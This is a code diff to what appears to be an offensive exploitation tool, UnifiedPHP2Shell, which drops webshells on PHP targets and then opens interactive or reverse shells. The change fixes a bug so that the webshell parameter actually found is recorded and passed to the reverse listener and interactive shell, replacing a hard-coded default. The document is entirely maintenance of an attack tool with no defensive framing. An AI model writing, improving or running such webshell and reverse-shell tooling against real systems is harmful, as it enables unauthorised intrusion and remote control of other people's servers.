@@ -473,6 +473,7 @@ class ExploitResult:
     target: str = ""
     status: ExploitStatus = ExploitStatus.FAILED
     webshell_url: Optional[str] = None
+    webshell_param: str = DEFAULT_PARAM
     command_output: Optional[str] = None
     reverse_shell_connected: bool = False
     details: str = ""
@@ -1517,6 +1518,7 @@ class UnifiedPHP2Shell:
         if live_shell:
             res.status = ExploitStatus.WEBSHELL_DROPPED
             res.webshell_url = live_shell
+            res.webshell_param = param
             self.progress("  └─ [WEBSHELL LIVE]:", f"{live_shell} (param: {param})", Fore.GREEN)
 
             # Command execution
@@ -1918,9 +1920,9 @@ def main() -> int:
             # Interactive Shell / Reverse Listener Trigger
             if args.reverse or args.lhost:
                 lhost_ip = args.lhost or "127.0.0.1"
-                pipe.launch_reverse_listener(lhost_ip, args.lport, er.webshell_url, DEFAULT_PARAM)
+                pipe.launch_reverse_listener(lhost_ip, args.lport, er.webshell_url, er.webshell_param)
             elif do_shell and er.webshell_url:
-                pipe.launch_interactive_shell(er.webshell_url, DEFAULT_PARAM)
+                pipe.launch_interactive_shell(er.webshell_url, er.webshell_param)
 
         all_results.append(t_res)
         if not args.json:
